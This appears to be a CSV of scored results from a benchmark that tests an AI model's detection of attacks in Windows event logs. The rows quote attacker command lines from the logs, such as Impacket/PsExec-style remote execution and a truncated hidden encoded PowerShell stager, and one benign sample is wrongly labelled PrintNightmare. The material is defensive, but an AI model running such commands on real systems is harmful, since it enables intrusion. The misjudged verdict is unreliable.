# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,"ID4688,4698,4699,5145,4624-ATexec remote trask creation (GLOBAL).csv",,,processed,YES,100.0,80.0,YES,"4624, 5145, 4698, 4688, 4699","cmd.exe, conhost.exe, whoami.exe, C:\Windows\System32\svchost.exe","admmig, FS01$, LocalSystem, S-1-5-18","cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami","10.23.23.9, 10.23.123.11",,0.0,6.34,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4698, 4688, 4699, 4699
- Processes: cmd.exe, conhost.exe, whoami.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, FS01$, LocalSystem, S-1-5-18
- Commands: cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami  
- Network: 10.23.23.9, 10.23.123.11
- Registry: None

EXPLANATION:
This shows a classic remote task-scheduler lateral movement (Atexec/PsExec-style) attack: a remote NTLM logon over the IPC$ share accesses the atsvc named pipe, then a randomly-named hidden scheduled task (\bouWFQYO) is created (4698), executed as LocalSystem to run ""whoami"" with output redirected to a .tmp file, and immediately deleted (4699). The output file is then read back and deleted over the ADMIN$ share, matching the cleanup behavior of automated remote-execution tooling. The random task name, SYSTEM-level execution, output redirection to a temp file, and rapid create/delete cycle are strong indicators of malicious remote command execution."
claude-opus-4-8,"ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).csv",,,processed,YES,100.0,86.1,YES,"1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447","cmd.exe, conhost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$","cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""","10.23.123.11, 127.0.0.1","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,9.55,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447
- Processes: cmd.exe, conhost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: 10.23.123.11, 127.0.0.1
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates

EXPLANATION:
The Security log was cleared (Event 1102) immediately followed by repeated NTLM Type-3 network logons from 10.23.123.11 by admmig, then WmiPrvSE.exe spawning cmd.exe writing output to \\127.0.0.1\ADMIN$\__<timestamp> — the classic Impacket wmiexec command-execution pattern with output redirection to the ADMIN$ share. This combination of log clearing, remote WMI-driven cmd execution, and SeDebug/SeImpersonate privilege assignment indicates lateral movement and remote code execution by an attacker."
claude-opus-4-8,"ID4720,4698-Fortinet APT group abuse on Windows.csv",,,processed,YES,100.0,100.0,YES,"4720, 4698",,"WADGUtilityAccount, elie, admmig",adf,,,0.0,5.00,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720, 4720, 4698
- Processes: None
- Accounts: WADGUtilityAccount, elie, admmig
- Commands: adf
- Network: None
- Registry: None

EXPLANATION:
The account admmig created two new local user accounts (WADGUtilityAccount, a known persistence-style utility account name, and elie) on fs01.offsec.lan within minutes, then registered a scheduled task (\Microsoft\SynchronizeTimeZone) masquerading as a legitimate system task. The scheduled task's Exec action runs a suspicious, non-standard command (""adf""), and the combination of rapid account creation plus persistence via a disguised scheduled task is consistent with attacker persistence establishment rather than routine administration."
claude-opus-4-8,"ID4742,4935,4662,4661,5137-DCshadow attack (GLOBAL) failed.csv",,,processed,YES,100.0,37.5,YES,"4662, 4742, 4935, 5137, 5136, 4936, 4929",,"admmig, JUMP01$",,"jump01.offsec.lan, rootdc1.offsec.lan, offsec.lan",,0.0,7.67,2.2,5.0,4.0,3,14.2,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4662, 4742, 4935, 5137, 5136, 4936, 4929, 4662
- Processes: None
- Accounts: admmig, JUMP01$
- Commands: None
- Network: jump01.offsec.lan, rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
The account admmig modified the servicePrincipalName attribute of computer object JUMP01$ and the events show a DRSReplica/replication attempt (Event 4929 SourceAddr jump01.offsec.lan, NamingContext DC=offsec,DC=lan with DRSGetNCChanges-related access masks like %%7688 on the DS-Replication-Get-Changes objects) consistent with a DCSync-style replication attempt from a non-DC computer. The SPN manipulation paired with replication operations targeting the domain naming context (Event 4935/4936 replication audit and the GUID 1131f6ac-9c07-11d1 / 9923a32a control access rights for Get-Changes/Get-Changes-All) indicates an attempt to grant a workstation directory replication rights, a known credential-theft technique."
claude-opus-4-8,"ID47x,4661-4662,5136,4688,4697-SAM the admin (CVE-2021-42287).csv",,,processed,YES,100.0,59.9,YES,"4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688","C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, compnay-88$, rootdc1, admmhorvath, ROOTDC1$, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a",,0.0,11.64,3.6,6.0,4.0,4,17.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688
- Processes: C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
- Accounts: hack1, compnay-88$, rootdc1, admmhorvath, ROOTDC1$, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan
- Commands: C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- Network: 10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
This sequence shows a textbook attack chain from the attacker workstation (10.23.123.11): the user hack1 creates a machine account (compnay-88$, EventID 4741) then renames it to ""rootdc1"" (4781) and requests Kerberos tickets — the classic NoPwd/sAMAccountName spoofing (CVE-2021-42278/42287 ""noPac"") privilege escalation against the domain controller. This is followed by admmhorvath using svcctl over IPC$ to install a service (4697 ""BTOBTO"") that runs a cmd.exe payload redirecting output to \\127.0.0.1\C$\__output — the signature of PsExec/Impacket-style remote command execution. The account manipulation, sAMAccountName rename, and remote service-based code execution on the DC together constitute a clear domain compromise."
claude-opus-4-8,"ID5140-5145,4688,4697-Encrypted payload deployed with service over SMB (GLOBAL).csv",,,processed,YES,100.0,67.8,YES,"5140, 5145, 4697, 4688","powershell.exe, cmd.exe, conhost.exe, services.exe, cscript.exe, MonitoringHost.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe","admmig, OFFSEC, SRVDEFENDER01$, LocalSystem","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGAC...'')))...",10.23.123.11,,16.7,10.97,4.1,6.0,3.3,4,17.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5140, 5145, 4697, 4688
- Processes: powershell.exe, cmd.exe, conhost.exe, services.exe, cscript.exe, MonitoringHost.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe
- Accounts: admmig, OFFSEC, SRVDEFENDER01$, LocalSystem
- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGAC...'')))...
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
The account ""admmig"" connected remotely from 10.23.123.11 over ADMIN$/IPC$ shares and accessed the svcctl named pipe (AccessMask 0x7), then created a service (Event 4697 ""iOWamcEn"") running %COMSPEC% launching a hidden, base64/gzip-encoded PowerShell payload — a classic PsExec-style lateral movement and remote code execution pattern. The service spawned cmd.exe → powershell.exe → SysWOW64 powershell.exe executing the obfuscated GzipStream-decoded scriptblock under LocalSystem, which is consistent with Empire/Cobalt Strike-style stagers. This combination of remote service install and encoded fileless PowerShell execution is strongly indicative of an attack rather than the benign periodic MonitoringHost/cscript activity seen elsewhere."
claude-opus-4-8,ID5145-4624-DonPAPI full extraction.csv,,,processed,YES,100.0,84.2,YES,"1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662","C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, FS03VULN$, admmig, ANONYMOUS LOGON","C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff",10.23.123.11,"HKLM Policy\Secrets\$MACHINE.ACC, RemoteRegistry, winreg
- Files: SYSTEM32\ZuExrArX.tmp, SYSTEM32\XwYybEmH.tmp, Users\admmig\AppData\Roaming\Microsoft\Credentials, ultravnc.ini, RDCMan.settings, hosts",0.0,15.77,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662
- Processes: C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
- Accounts: hack1, FS03VULN$, admmig, ANONYMOUS LOGON
- Commands: C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 10.23.123.11
- Registry: HKLM Policy\Secrets\$MACHINE.ACC, RemoteRegistry, winreg
- Files: SYSTEM32\ZuExrArX.tmp, SYSTEM32\XwYybEmH.tmp, Users\admmig\AppData\Roaming\Microsoft\Credentials, ultravnc.ini, RDCMan.settings, hosts

EXPLANATION:
The log opens with Event 1102 (Security log cleared) by account ""hack1"" — a classic anti-forensic/defense-evasion action — followed by an ANONYMOUS LOGON NTLMv1 and repeated NTLM logons from 10.23.123.11 using ""admmig"" with full SeDebug/SeImpersonate privileges, plus PsExec-style ADMIN$ writes of random .tmp files and svcctl/RemoteRegistry service handle creation (4674). The actor then systematically reads DPAPI master keys, Credentials, Vault, browser profiles, UltraVNC/RDCMan/mRemoteNG config files and drops cmd.exe /c C:\tools\shell.cmd plus night.bat, indicating credential harvesting (SharpHound/SecretsDump/LaZagne-style) and remote code execution. The combination of log clearing, anonymous NTLMv1, privilege escalation, lateral remote service abuse, and mass secret/credential file access is unambiguously malicious."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-services-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc""",,,0.0,4.08,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc""
- Network: None
- Registry: None

EXPLANATION:
This event shows mmc.exe launching the Services management console (services.msc) from explorer.exe, which is normal administrative activity. The process is a signed Microsoft binary running from its standard System32 path, launched interactively by an Administrator. There are no suspicious command-line arguments, network connections, or registry modifications indicating malicious behavior."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-eventvwr-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s",,,0.0,4.48,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: mmc.exe, explorer.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s
- Network: None
- Registry: None

EXPLANATION:
This event shows mmc.exe launching the standard Event Viewer snap-in (eventvwr.msc) from explorer.exe, which is routine administrative activity. The image is a signed Microsoft binary running from the legitimate System32 path, and the command line reflects normal Event Viewer usage. No suspicious child processes, network connections, or registry modifications are present."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-secpol-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s, ""C:\Windows\system32\ServerManager.exe""",,,0.0,7.12,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s, ""C:\Windows\system32\ServerManager.exe""
- Network: None
- Registry: None

EXPLANATION:
This event shows the Microsoft Management Console (mmc.exe) launching the Local Security Policy snap-in (secpol.msc) as a child of ServerManager.exe, which is normal administrative behavior on a Windows Server. The executable is signed by Microsoft, located in the standard System32 path, and run by an Administrator account in an interactive session. There are no suspicious command lines, network connections, or registry modifications indicating malicious activity."
claude-opus-4-8,BENIGN-ID1-rundll32-appxdeploymentextensions-onecore-dll-shellrefres.csv,,,processed,NO,100.0,100.0,YES,1,"rundll32.exe, svchost.exe","WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM","rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc",,,0.0,4.22,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: rundll32.exe, svchost.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM
- Commands: rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc
- Network: None
- Registry: None

EXPLANATION:
This event shows rundll32.exe executing a legitimate signed Microsoft DLL (AppXDeploymentExtensions.OneCore.dll) with the ShellRefresh function, spawned by svchost.exe running the AppXSvc service. The parent-child relationship, signed Microsoft binaries, and standard system32 paths are consistent with normal Windows AppX deployment activity. There is no suspicious network, registry, or command-line abuse indicative of an attack."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-comexp-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"", ""C:\Windows\system32\ServerManager.exe""",,,0.0,4.04,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"", ""C:\Windows\system32\ServerManager.exe""
- Network: None
- Registry: None

EXPLANATION:
This event shows an Administrator launching the Microsoft Management Console (mmc.exe) to open the Component Services snap-in (comexp.msc) from a legitimate signed Microsoft binary in System32. The parent process is ServerManager.exe, which is a normal administrative tool, and the activity is consistent with routine server administration. There are no suspicious command lines, network connections, or registry modifications indicating malicious behavior."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-gpedit-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\sihost.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc, sihost.exe",,,0.0,4.13,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\sihost.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc, sihost.exe
- Network: None
- Registry: None

EXPLANATION:
This event shows the Microsoft Management Console (mmc.exe) launching the Local Group Policy Editor (gpedit.msc), a signed Microsoft binary used for routine administrative configuration. The process was started by an Administrator account from the standard system directory with valid file hashes and no suspicious command-line arguments. This is normal administrative activity with no indicators of compromise."
claude-opus-4-8,BENIGN-ID1-dism-online.csv,,,processed,NO,100.0,100.0,YES,1,C:\Windows\System32\Dism.exe,WIN-FPV0DSIC9O6\Administrator,"C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all",,,0.0,4.49,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\Dism.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all
- Network: None
- Registry: None

EXPLANATION:
This event shows the legitimate Microsoft-signed Dism.exe utility running from its standard System32 location to enable the DNS Server role and tools, a normal Windows administrative task. The command line, signed binary, and use of an Administrator account during role installation are all consistent with routine server configuration rather than malicious activity."
claude-opus-4-8,BENIGN-ID1-reg-query.csv,,,processed,NO,100.0,90.0,YES,1,"reg.exe, cmd.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64",,hklm\software\microsoft\windows\softwareinventorylogging,0.0,4.65,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: reg.exe, cmd.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
- Network: None
- Registry: hklm\software\microsoft\windows\softwareinventorylogging

EXPLANATION:
This event shows a read-only registry query against the SoftwareInventoryLogging key, which is consistent with routine system inventory/management activity rather than modification or persistence. The reg.exe process was spawned by cmd.exe under the legitimate signed Microsoft binary, and no values were altered or harmful commands executed."
claude-opus-4-8,BENIGN-ID1-regsvr32-s.csv,,,processed,YES,100.0,100.0,YES,1,"regsvr32.exe, spoolsv.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll""",,,0.0,4.39,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: regsvr32.exe, spoolsv.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll""
- Network: None
- Registry: None

EXPLANATION:
The Print Spooler service (spoolsv.exe) spawning regsvr32.exe to silently register PrintConfig.dll from the printer driver directory is a hallmark of PrintNightmare (CVE-2021-34527) exploitation, where a malicious DLL is loaded via the spooler. The SYSTEM-level execution and abuse of the print driver path indicate privilege escalation/remote code execution rather than legitimate printer configuration."
claude-opus-4-8,BENIGN-ID1-rundll32-c-windows-system32-shell32-dll-shcreatelocalserv.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","SIGMA\Administrator, NT AUTHORITY\SYSTEM","C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding",,,0.0,5.13,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
- Accounts: SIGMA\Administrator, NT AUTHORITY\SYSTEM
- Commands: C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
- Network: None
- Registry: None

EXPLANATION:
This event shows rundll32.exe launching shell32.dll's SHCreateLocalServerRunDll function with a COM CLSID and the -Embedding flag, spawned by svchost.exe running the DcomLaunch service. This is a standard COM/DCOM activation pattern from a signed Microsoft binary using legitimate file paths and hashes. No suspicious parent-child chain, network activity, or anomalous command-line arguments are present, indicating routine Windows operating system behavior."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-compmgmt-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s",,,0.0,4.38,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe
- Accounts: SIGMA\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s
- Network: None
- Registry: None

EXPLANATION:
This event shows the Microsoft Management Console (mmc.exe) launching the Computer Management snap-in (compmgmt.msc) from Server Manager, a normal administrative workflow on a Windows Server. The executable is signed by Microsoft, runs from the legitimate System32 path, and the parent-child relationship (ServerManager.exe spawning mmc.exe) is expected. There are no suspicious commands, network connections, or registry modifications indicating attack behavior."
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-dsa-msc.csv,,,error,NO,0.0,0.0,NO,,,,,,,,0.33,,,,,,,"Error: Anthropic rejected the request - Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'Your credit balance is too low to access the Anthropic API. Please go to Plans & Billing to upgrade or purchase credits.'}, 'request_id': 'req_011CbytUYF6gCK841JRpZhCN'}"
claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-gpmc-msc.csv,,,error,NO,0.0,0.0,NO,,,,,,,,0.11,,,,,,,"Error: Anthropic rejected the request - Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'Your credit balance is too low to access the Anthropic API. Please go to Plans & Billing to upgrade or purchase credits.'}, 'request_id': 'req_011CbytUZuZ6nMhHRCgmqByU'}"
